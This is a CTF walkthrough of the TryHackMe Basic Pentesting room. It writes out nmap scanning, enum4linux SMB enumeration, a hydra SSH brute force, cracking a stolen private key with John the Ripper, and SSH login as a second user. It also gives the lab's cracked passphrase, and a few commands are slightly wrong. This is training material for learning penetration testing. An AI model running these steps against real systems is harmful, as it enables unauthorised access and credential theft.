# âœ… TryHackMe CTF Walkthrough: Basic Pentesting

This repository contains a comprehensive walkthrough of how I solved the **Basic Pentesting CTF** on TryHackMe.  
The CTF focuses on fundamental penetration testing skills by simulating a vulnerable machine designed for beginners.

---

## ðŸŽ¯ Room Overview

The **Basic Pentesting CTF** is a practical introduction to penetration testing methodologies.  
It is structured to teach and test key skills such as:

- VPN connectivity to the TryHackMe network.  
- Information gathering and reconnaissance techniques.  
- Web directory busting.  
- SMB service enumeration and exploitation.  
- Brute-force attacks to crack weak passwords.  
- SSH key extraction and cracking for privilege escalation.  
- Practical use of essential pentesting tools.

## ðŸ“š Step-by-Step Walkthrough

1. Connect With the TryHackMe server using Command:  
   ```bash
   sudo openvpn Downloads/Ynos.ovpn
   ```

2. Confirm you can connect to the machine using the command:  
   ```bash
   ping <IP of the machine>
   ```

3. Start the nmap scan with:  
   ```bash
   nmap -sV -O -T5 -p- 10.10.87.116 -oN Nmap.results
   ```

4. While scanning, start directory busting the website and you will find some directories here mainly **development** (nothing important).

5. The nmap results will show that the **SMB service is open on ports 139 and 445**, which is a very buggy and exploitable service.  
   We will exploit this to gain access to this computer.

6. As the SMB service is open, we will attack it with the tool **enum4linux** using the command:  
   ```bash
   enum4linux 10.10.87.116 | tee enum4linux.results
   ```

7. From this result, we find out that the username of this person is **jan**.  
   Previously from our enumeration, we found that this person had a weak password, so we will perform a brute-force attack with **hydra** using the command:  
   ```bash
   hydra -l jan -P /usr/share/wordlists/rockyou.txt -f ssh://10.10.87.116 -o hydra.results
   ```

8. From hydra, we discovered the password for this user.

9. Now we will gain access to its shell using the command:  
   ```bash
   ssh jan@10.10.87.116
   ```

10. After gaining access, start enumeration with basic commands like:  
    ```bash
    id
    sysinfo
    ```

11. During enumeration, I learned that there is a file that contains a key to your machine that you can give to someone, allowing them to log into the computer as you.

12. Found that jan had the file in the **.ssh folder named id_rsa**.

13. Now we need to convert the private key into a hash format that can be cracked by John the Ripper.

14. We do that by running:  
    ```bash
    ssh2john id_rsa > hash
    ```  
    where `hash` is the filename of the newly created hash.

15. Now we crack this hash using:  
    ```bash
    john hash --wordlists=/usr/share/wordlists/rockyou.txt
    ```

16. The passphrase revealed by John the Ripper was:  
    ```
    beeswax
    ```

17. If we try to get the shell at this point, it will say that file permission is too open, so we need to change file permission to 600 by the command:  
    ```bash
    chmod 600 id_rsa
    ```

18. Now we will gain access to the shell using the command:  
    ```bash
    ssh -i id_rsa kay@10.10.87.116
    ```

19. Enter pass:  
    ```
    beeswax
    ```

20. Successfully got the shell through user **kay**.
